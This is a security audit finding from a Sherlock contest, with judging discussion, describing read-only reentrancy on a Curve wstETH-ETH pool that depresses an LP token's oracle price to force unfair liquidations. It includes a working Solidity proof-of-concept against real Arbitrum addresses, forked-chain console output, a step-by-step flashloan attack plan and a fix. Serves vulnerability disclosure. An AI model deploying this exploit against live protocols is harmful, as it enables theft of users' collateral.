{
  "Title": "H-1: H-01 wstETH-ETH Curve LP Token Price can be manipulated to Cause Unexpected Liquidations",
  "Content": "# Issue H-1: H-01 wstETH-ETH Curve LP Token Price can be manipulated to Cause Unexpected Liquidations \n\nSource: https://github.com/sherlock-audit/2022-12-sentiment-judging/issues/7 \n\n## Found by \nBahurum, GalloDaSballo\n\n## Summary\n\nThe wsteETH-ETH LP token is priced via it's [`virtual_price`](https://github.com/sherlock-audit/2022-12-sentiment/blob/main/oracle/src/curve/StableCurveEthOracle.sol#L72)\n\nThrough what [Chainalysis called View only Reentrancy](https://chainsecurity.com/heartbreaks-curve-lp-oracles/), we can reduce the value of `virtual_price`, causing the RiskEngine to trigger a liquidation event.\n\n## Vulnerability Detail\n\nPer some testing I made, we know that the Debt for such an account will be denominated in WETH, this price cannot be tampered.\n\nHowever, the price of the ETH-wstETH LP Token can be manipulated by calling the RiskEngine while reEntering from the `POOL.remove_liquidity` function.\n\nThis is possible because the function will send ETH first, before updating it's internal wstETH balances.\n\nTo test the maximum impact I simulated borrowing an infinite amount of WETH (by impersonating the GMX Vault).\n\nIf that amount of ETH were available on Arbitrum, we can achieve over 10x in price suppression, effectively making any \"normal\" account instantly liquidatable.\n\nThe estimated cost of the attack is 60 BPS of the total ETH used (due to price impact)\n\n## Impact\n\nBecause of the price manipulation, we can trigger unfair liquidations to our advantage, because the cost of manipulation is in the 50BPS range, any time a big enough deposit is made, it becomes profitable to force liquidate them.\n\nIn the theoretical scenario shown below (borrowing from GMX Vault), I can effectively liquidate any account using the token.\nA more pragmatic scenario is listed below as well\n\n## Code Snippet\n\nBelow a simulation showing how to achieve the Virtual Price Manipulation, the last piece of the attack would be to call liquidate on an account while re-entering\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.10;\n\n\nimport {IERC20} from \"@oz/token/ERC20/IERC20.sol\";\nimport {SafeERC20} from \"@oz/token/ERC20/utils/SafeERC20.sol\";\nimport {ReentrancyGuard} from \"@oz/security/ReentrancyGuard.sol\";\n\ninterface IAccount {\n  function getAssets() external view returns (address[] memory);\n  function getBorrows() external view returns (address[] memory);\n}\ninterface IRiskEngine {\n  function getBalance(address account) external view returns (uint);\n  function getBorrows(address account) external view returns (uint);\n}\n\ninterface ISentimentCore {\n  function riskEngine() external view returns (address);\n}\n\ninterface ICurvePool {\n  function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);\n  function remove_liquidity(uint256 amount, uint256[2] memory min_amounts) external returns (uint256);\n  function get_virtual_price() external view returns (uint256);\n}\n\ninterface ILP {\n  function balanceOf(address) external view returns (uint256);\n}\n\ncontract VirtualPriceManip {\n  ICurvePool POOL = ICurvePool(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80);\n  ILP LP = ILP(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);\n  ILP WSTETH = ILP(0x5979D7b546E38E414F7E9822514be443A4800529);\n  // Get WETH\n\n  // Check Virtual Price\n\n  // Deposit into Curve\n\n  // Check Virtual Price\n\n  // Withdraw, and ReEnter\n\n  // Check Virtual Price\n\n  // End, Check Virtual Price\n\n  event Debug(string name, uint256 value);\n\n  function fakeSentimentPrice() internal returns (uint256){\n    uint256 FAKE_WETH_PRICE = 1e18;\n    return FAKE_WETH_PRICE * POOL.get_virtual_price() / 1e18;\n  }\n\n  function startAttack() external payable {\n    uint256 amt = msg.value;\n\n    // 1. Check Virtual Price\n    emit Debug(\"Virtual Price 1\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 1\", fakeSentimentPrice());\n\n    // 2. Curve deposit\n    uint256[2] memory dep = [amt, 0];\n    POOL.add_liquidity{value: amt}(dep, 1);\n\n    // 3. Check Virtual Price\n    emit Debug(\"Virtual Price 3\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 3\", fakeSentimentPrice());\n\n    // 4. Curve Withdraw\n    // TODO: This is where profit maximization math will be necessary\n    uint256[2] memory dep2 = [uint256(0), uint256(0)];\n    POOL.remove_liquidity(LP.balanceOf(address(this)), dep2);\n\n    // 6. Check Virtual Price\n    emit Debug(\"Virtual Price 6\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 6\", fakeSentimentPrice());\n\n    // TODO: Check loss in ETH and compare vs wstETH we now have\n    // Loss is there, but should be marginal / imbalance + fees\n    emit Debug(\"Msg.value\", msg.value);\n    emit Debug(\"This Balance\", address(this).balance);\n    emit Debug(\"Delta\", msg.value - address(this).balance);\n\n    emit Debug(\"WstEthBalance\", WSTETH.balanceOf(address(this)));\n  }\n\n  receive() external payable {\n    // 5. Reenter here\n\n    // Check Virtual Price\n    emit Debug(\"Virtual Price 5\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 5\", fakeSentimentPrice());\n  }\n}\n```\n\nHere the Brownie Console for the maximum theoretical attack\n\n```python\n\nweth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\nwhale = accounts.at(\"0x489ee077994b6658eafa855c308275ead8097c4a\", force=True)\n \nweth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\nweth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\nc = VirtualPriceManip.deploy({\"from\": a[0]})\nc.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\n \nFetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\nFetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\nTransaction sent: 0x69a4ee6fba72894d2e6c7ba556a6df8bb2159981e09b7dd947283368628baefa\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  TransparentUpgradeableProxy.transfer confirmed   Block: 42567825   Gas used: 39080 (0.20%)\n\nTransaction sent: 0xfecb0db00b3db0b7b6cf22bc1adc92d16169060ead3a9c13f88a19b0c57fd666\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n  TransparentUpgradeableProxy.withdraw confirmed   Block: 42567826   Gas used: 30937 (0.15%)\n\nTransaction sent: 0x198d4b73e7def112903606efa77c0add9910e7f3e86186e310a0adbfec0adebc\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  VirtualPriceManip.constructor confirmed   Block: 42567827   Gas used: 647070 (3.24%)\n  VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n\nTransaction sent: 0x101e212ca64ed3fc6595c15c30706a8075a010ed866ba5b230cb494f9ac20c5c\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n  VirtualPriceManip.startAttack confirmed   Block: 42567828   Gas used: 354622 (1.77%)\n\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1005466150529603227)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1005466150529603227)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1005678057072654996)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1005678057072654996)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 93457469619424556)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 93457469619424556)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1005678057072654996)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1005678057072654996)]), OrderedDict([('name', 'Msg.value'), ('value', 86826027227418610000000)]), OrderedDict([('name', 'This Balance'), ('value', 83541864626282883099978)]), OrderedDict([('name', 'Delta'), ('value', 3284162601135726900022)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2736183720644597163208)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 81436145961234587181162)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2736183720644597163208)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 81436145961234587181162)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (86826027227418610000000, 0)), ('fees', (11884971933620921875, 9942362504203593908)), ('invariant', 86698045640581035174753), ('token_supply', 86190407433150506590178)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (83541864626282883099978, 2736183720644597163208)), ('fees', (0, 0)), ('token_supply', 4754261471915919409016)])]}\n\n\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n>>> eth_to_convert = 2736183720644597163208 * 1.08\n>>> 3284162601135726900022 - eth_to_convert\n3.290841828395613e+20\n>>> 3.290841828395613e+20 / 86826027227418610000000 * 100\n## 37 BPS to perform the attack, remaining costs would bring it up to around 50 BPS (swap wstETH, cost of liquidations, etc..)\n0.3790155939964975\n\n## See `fakeSentiment5 vs fakeSentimen1`\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n\n\"\"\"\nPrice is 9% of it's original value, we achieve a 10X price depreciation, allowing us to liquidate any user that has taken minimal leverage\n\"\"\"\n\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAt this time, I would recommend NOT to use the ETH-stETH LP Token as the price is manipulatable.\nThe only rational way I could expect this to be solved is for Chainlink to offer virtual_price oracles, or the development of a TWAP for the virtual_price.\n\n\n## Additional Considerations\n\nThe theoretical maximum attack allows to effectively liquidate any account that uses the stETH-WETH Pool.\n\nIn practice, via an AAVE Flashloan I'm able to borrow up to 14.5k WETH, which allows to move the price by over 11%, meaning that some accounts, that are levered at around 90% could be unfairly liquidated.\n\n```python\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1005466094471744332)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1005466094471744332)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1005497298777214105)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1005497298777214105)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 890315892210177531)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 890315892210177531)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1005497298777214105)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1005497298777214105)]), OrderedDict([('name', 'Msg.value'), ('value', 1452330000000000000000)]), OrderedDict([('name', 'This Balance'), ('value', 713314090131700921245)]), OrderedDict([('name', 'Delta'), ('value', 739015909868299078755)]), OrderedDict([('name', 'WstEthBalance'), ('value', 677574531693017948098)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('_value', 1449753409949781400798)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('value', 677574531693017948098)]), OrderedDict([('_from', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 1449753409949781400798)])], 'AddLiquidity': [OrderedDict([('provider', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('token_amounts', (1452330000000000000000, 0)), ('fees', (192842135570862938, 176890872766115807)), ('invariant', 6238313797265075968081), ('token_supply', 6204014881865700809814)])], 'RemoveLiquidity': [OrderedDict([('provider', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('token_amounts', (713314090131700921245, 677574531693017948098)), ('fees', (0, 0)), ('token_supply', 4754261471915919409016)])]}\n>>> 890315892210177531 / 1005466094471744332\n##Â Around 11.2% Price Manipulation with 14.5k ETH used\n0.8854757978467043\n```\n\nTo put it in simple terms, the cost of this attack is around $90k and it will be profitable to liquidate any position above $100k\n\n## Discussion\n\n**Evert0x**\n\nComment from WatchPug (lead senior)\n\n> We find the issue to be valid.\n> \n> However, the economics of the attack may not be profitable, and the preconditions and requirements for such an attack can be narrow. We also believe that flashloans cannot be utilized as the entrance for the attack: `POOL.remove_liquidity()` will add a reentrancy lock which prevents `remove_liquidity()` on the liquidation impounded lpToken assets.\n> \n> As the revenue/profit from such an attack cannot be used to repay the loan within the same block, flashloans cannot be used.\n\nAlthough the impact is high we judge the issue to be medium severity because of the requirements and conditions described in the comment from WatchPug.\n\n\n**bahurum**\n\nEscalate for 50 USDC. \nI believe the issue has been downgraded incorrectly to medium severity. The lead senior watson justifies the downgrading with 2 arguments, which I would like to dispute both.\n1. **The attack may not be profitable and needs narrow preconditions**: The attack is profitable as in the `Additional Considerations` section, the watson shows by mistake the impact of a 1452 ETH loan instead of 14520 ETH flash-borrowable from Aave on arbitrum (see 'Msg.value' field in debug log). With 14.5k ETH the virtual price would be reduced by 45%, which is much more than 11%. Any account holding a substantial amount of this curve LP and with risky margin will be liquidated (for example if 50 % of collateral is WstETH-ETH curve LP and margin is 20% it will be liquidated). Here is a realistic attack scenario:\n   - The accounts holding the LP token amount to 2M $ in total value and half of them (1M $ value) can be liquidated with 40% manipulation of the LP price\n   - Attacker flash borrows 14k WETH (17M $) and converts to ETH\n   - Attacker calls `add_liquidity` with 16M $ worth of ETH, keeps 1M $ for liquidations\n   - Attacker calls `remove_liquidity` with all LP obtained\n   - On reentrant call:\n        - swaps 1M $ for the required tokens needed for liquidation\n        - liquidates accounts and gets an average liquidation premium of at least 20%, so 200k $ in total\n    - Exit call to attacker's `fallback` or `receive` function\n    - Execution of call to `remove_liquidity` resumes and finishes\n     - Attacker swaps 200k $ worth of stolen tokens back to ETH. Note that WstETH-ETH LP stolen can also be swapped back to ETH since the call to `remove_liquidity` is already exited.\n   - Repay the flashloan and profit. Cost of pool imbalanace + loan is around 0.5 % as shown in the PoC, so about 85k $. Profit is at least 100k $ in this scenario. The attacker doesn't need to provide any funds up front.\n2.  **flashloans cannot be utilized as the entrance for the attack**: This is not true since the WstETH-ETH LP tokens are sent to the attacker during liquidation, which occurs during the call to `remove_liquidity`, but they can be swapped back to ETH after the end of the call to `remove_liquidity` and before the end of the tx. So there is no reentrancy in `remove_liquidity` in this attack. See the scenario above.\n\nIn addition, this bug is well known and probably calls to the pool's `get_virtual_price` are being scanned to find vulnerable contracts, so black hats would have noticed the bug very soon.\n\nFinally, and not related to the escalation, I would like to suggest again a fix as I made some confusion when I suggested it in my own submission:\n\n```diff\n    function getPrice(address token) external view returns (uint) {\n        ICurvePool pool = ICurveLP(token).minter();\n+       uint256[2] calldata amounts;\n+       pool.remove_liquidity(0, amounts);\n        address coin;\n        uint price;\n        uint minPrice = oracleFacade.getPrice(WETH);\n        for(uint i; i<N_COINS; i++) {\n            coin = pool.coins(i);\n            if (coin != ETH) {\n                price = oracleFacade.getPrice(coin);\n                minPrice = (price < minPrice) ? price : minPrice;\n            }\n        }\n\n        return minPrice.mulWadDown(pool.get_virtual_price());\n    }\n```\n\n**sherlock-admin**\n\n > Escalate for 50 USDC. \n> I believe the issue has been downgraded incorrectly to medium severity. The lead senior watson justifies the downgrading with 2 arguments, which I would like to dispute both.\n> 1. **The attack may not be profitable and needs narrow preconditions**: The attack is profitable as in the `Additional Considerations` section, the watson shows by mistake the impact of a 1452 ETH loan instead of 14520 ETH flash-borrowable from Aave on arbitrum (see 'Msg.value' field in debug log). With 14.5k ETH the virtual price would be reduced by 45%, which is much more than 11%. Any account holding a substantial amount of this curve LP and with risky margin will be liquidated (for example if 50 % of collateral is WstETH-ETH curve LP and margin is 20% it will be liquidated). Here is a realistic attack scenario:\n>    - The accounts holding the LP token amount to 2M $ in total value and half of them (1M $ value) can be liquidated with 40% manipulation of the LP price\n>    - Attacker flash borrows 14k WETH (17M $) and converts to ETH\n>    - Attacker calls `add_liquidity` with 16M $ worth of ETH, keeps 1M $ for liquidations\n>    - Attacker calls `remove_liquidity` with all LP obtained\n>    - On reentrant call:\n>         - swaps 1M $ for the required tokens needed for liquidation\n>         - liquidates accounts and gets an average liquidation premium of at least 20%, so 200k $ in total\n>     - Exit call to attacker's `fallback` or `receive` function\n>     - Execution of call to `remove_liquidity` resumes and finishes\n>      - Attacker swaps 200k $ worth of stolen tokens back to ETH. Note that WstETH-ETH LP stolen can also be swapped back to ETH since the call to `remove_liquidity` is already exited.\n>    - Repay the flashloan and profit. Cost of pool imbalanace + loan is around 0.5 % as shown in the PoC, so about 85k $. Profit is at least 100k $ in this scenario. The attacker doesn't need to provide any funds up front.\n> 2.  **flashloans cannot be utilized as the entrance for the attack**: This is not true since the WstETH-ETH LP tokens are sent to the attacker during liquidation, which occurs during the call to `remove_liquidity`, but they can be swapped back to ETH after the end of the call to `remove_liquidity` and before the end of the tx. So there is no reentrancy in `remove_liquidity` in this attack. See the scenario above.\n> \n> In addition, this bug is well known and probably calls to the pool's `get_virtual_price` are being scanned to find vulnerable contracts, so black hats would have noticed the bug very soon.\n> \n> Finally, and not related to the escalation, I would like to suggest again a fix as I made some confusion when I suggested it in my own submission:\n> \n> ```diff\n>     function getPrice(address token) external view returns (uint) {\n>         ICurvePool pool = ICurveLP(token).minter();\n> +       uint256[2] calldata amounts;\n> +       pool.remove_liquidity(0, amounts);\n>         address coin;\n>         uint price;\n>         uint minPrice = oracleFacade.getPrice(WETH);\n>         for(uint i; i<N_COINS; i++) {\n>             coin = pool.coins(i);\n>             if (coin != ETH) {\n>                 price = oracleFacade.getPrice(coin);\n>                 minPrice = (price < minPrice) ? price : minPrice;\n>             }\n>         }\n> \n>         return minPrice.mulWadDown(pool.get_virtual_price());\n>     }\n> ```\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**GalloDaSballo**\n\nEscalate for 50 USDC.\nIn solidarity to my colleague, I re-ran my POC with whale being set to [aWETH](https://arbiscan.io/address/0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8) and you can see that the price impact is closer to 50%\n\n```python\n>>> weth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\nwhale = accounts.at(\"0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8\", force=True)\nFetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\nFetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\n>>> weth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\nweth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\nc = VirtualPriceManip.deploy({\"from\": a[0]})\nc.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\nTransaction sent: 0x986059eea98f64537fc18f576080d9df04a3b1d14566f3f11106d1f443c2a62e\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  TransparentUpgradeableProxy.transfer confirmed   Block: 45350953   Gas used: 39080 (0.20%)\n\nTransaction sent: 0x3aa0e109cf7f7983b6c4123a8befacda921f93969c7f1185e9175d2ad9bfc44c\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n  TransparentUpgradeableProxy.withdraw confirmed   Block: 45350954   Gas used: 30937 (0.15%)\n\nTransaction sent: 0xe4df2473de3a73a7a56b17cdf5acec0cd523f713fcfbbe80a40261f6519a74a3\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  VirtualPriceManip.constructor confirmed   Block: 45350955   Gas used: 647058 (3.24%)\n  VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n\nTransaction sent: 0xa3f759c1c16dffa1dfdc90faceb384d37aa462de39d01dc73ec55ac909f2d27d\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n  VirtualPriceManip.startAttack confirmed   Block: 45350956   Gas used: 346696 (1.73%)\n\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Msg.value'), ('value', 9242544511373299000000)]), OrderedDict([('name', 'This Balance'), ('value', 6887807551730873474275)]), OrderedDict([('name', 'Delta'), ('value', 2354736959642425525725)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2124028976089901491510)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 9136530630863310092133)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2124028976089901491510)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 9136530630863310092133)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (9242544511373299000000, 0)), ('fees', (1143210375408757286, 1031913016221942347)), ('invariant', 15635314996650963717127), ('token_supply', 15533814948437161604759)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (6887807551730873474275, 2124028976089901491510)), ('fees', (0, 0)), ('token_supply', 6397284317573851512626)])]}\n```\n\nMore specifically a 43% loss of value, which would put at risk a sizeable group of normally levered users:\n>>> 1006386728989215731 / 566156151085517748\n1.777578018113242\n>>> (1006386728989215731 - 566156151085517748) / 1006386728989215731 * 100\n43.743678769080375\n\nAlso agree with my colleague that once the liquidation is successful, we can exit the re-entered state and then settle once the `POOL.D` is back to normal, allowing for some price impact (60BPS on estimate), but still profiting by a great margin\n\n**sherlock-admin**\n\n > Escalate for 50 USDC.\n> In solidarity to my colleague, I re-ran my POC with whale being set to [aWETH](https://arbiscan.io/address/0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8) and you can see that the price impact is closer to 50%\n> \n> ```python\n> >>> weth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\n> whale = accounts.at(\"0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8\", force=True)\n> Fetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\n> Fetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\n> >>> weth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\n> weth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\n> c = VirtualPriceManip.deploy({\"from\": a[0]})\n> c.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\n> Transaction sent: 0x986059eea98f64537fc18f576080d9df04a3b1d14566f3f11106d1f443c2a62e\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n>   TransparentUpgradeableProxy.transfer confirmed   Block: 45350953   Gas used: 39080 (0.20%)\n> \n> Transaction sent: 0x3aa0e109cf7f7983b6c4123a8befacda921f93969c7f1185e9175d2ad9bfc44c\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n>   TransparentUpgradeableProxy.withdraw confirmed   Block: 45350954   Gas used: 30937 (0.15%)\n> \n> Transaction sent: 0xe4df2473de3a73a7a56b17cdf5acec0cd523f713fcfbbe80a40261f6519a74a3\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n>   VirtualPriceManip.constructor confirmed   Block: 45350955   Gas used: 647058 (3.24%)\n>   VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n> \n> Transaction sent: 0xa3f759c1c16dffa1dfdc90faceb384d37aa462de39d01dc73ec55ac909f2d27d\n>   Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n>   VirtualPriceManip.startAttack confirmed   Block: 45350956   Gas used: 346696 (1.73%)\n> \n> >>> history[-1].events\n> {'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1006386728989215731)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 566156151085517748)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1006460432180341199)]), OrderedDict([('name', 'Msg.value'), ('value', 9242544511373299000000)]), OrderedDict([('name', 'This Balance'), ('value', 6887807551730873474275)]), OrderedDict([('name', 'Delta'), ('value', 2354736959642425525725)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2124028976089901491510)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 9136530630863310092133)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2124028976089901491510)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 9136530630863310092133)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (9242544511373299000000, 0)), ('fees', (1143210375408757286, 1031913016221942347)), ('invariant', 15635314996650963717127), ('token_supply', 15533814948437161604759)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (6887807551730873474275, 2124028976089901491510)), ('fees', (0, 0)), ('token_supply', 6397284317573851512626)])]}\n> ```\n> \n> More specifically a 43% loss of value, which would put at risk a sizeable group of normally levered users:\n> >>> 1006386728989215731 / 566156151085517748\n> 1.777578018113242\n> >>> (1006386728989215731 - 566156151085517748) / 1006386728989215731 * 100\n> 43.743678769080375\n> \n> Also agree with my colleague that once the liquidation is successful, we can exit the re-entered state and then settle once the `POOL.D` is back to normal, allowing for some price impact (60BPS on estimate), but still profiting by a great margin\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted \n\nBased on comments & POC in the escalations, the judges consulted the Lead senior and concluded that this issue is a valid high.\n\n**sherlock-admin**\n\n> Escalation accepted \n> \n> Based on comments & POC in the escalations, the judges consulted the Lead senior and concluded that this issue is a valid high.\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n\n\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/28",
  "Code": [
    {
      "filename": "oracle/src/curve/StableCurveEthOracle.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.17;\n\nimport {IOracle} from \"../core/IOracle.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n\ninterface ICurvePool {\n    function coins(uint256) external view returns (address);\n    function get_virtual_price() external view returns (uint256);\n}\n\ninterface ICurveLP {\n    function minter() external view returns (ICurvePool);\n}\n\n/**\n    @title Stable curve oracle for ETH/Token(s) pair\n    @notice Price Oracle for curve stable eth lp\n*/\ncontract StableCurveEthOracle is IOracle {\n    using FixedPointMathLib for uint;\n\n    /* -------------------------------------------------------------------------- */\n    /*                               STATE VARIABLES                              */\n    /* -------------------------------------------------------------------------- */\n\n    /// @notice Oracle Facade\n    IOracle immutable oracleFacade;\n\n    /// @notice WETH\n    address immutable WETH;\n\n    /// @notice number of coins in the pool\n    uint immutable N_COINS;\n\n    /// @notice ETH address used by curve\n    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n\n    /* -------------------------------------------------------------------------- */\n    /*                                 CONSTRUCTOR                                */\n    /* -------------------------------------------------------------------------- */\n\n    /**\n        @notice Contract constructor\n        @param _oracle Address of oracleFacade\n    */\n    constructor(IOracle _oracle, address _WETH, uint _coins) {\n        oracleFacade = _oracle;\n        WETH = _WETH;\n        N_COINS = _coins;\n    }\n\n    /* -------------------------------------------------------------------------- */\n    /*                              PUBLIC FUNCTIONS                              */\n    /* -------------------------------------------------------------------------- */\n\n    /// @inheritdoc IOracle\n    function getPrice(address token) external view returns (uint) {\n        ICurvePool pool = ICurveLP(token).minter();\n\n        address coin;\n        uint price;\n        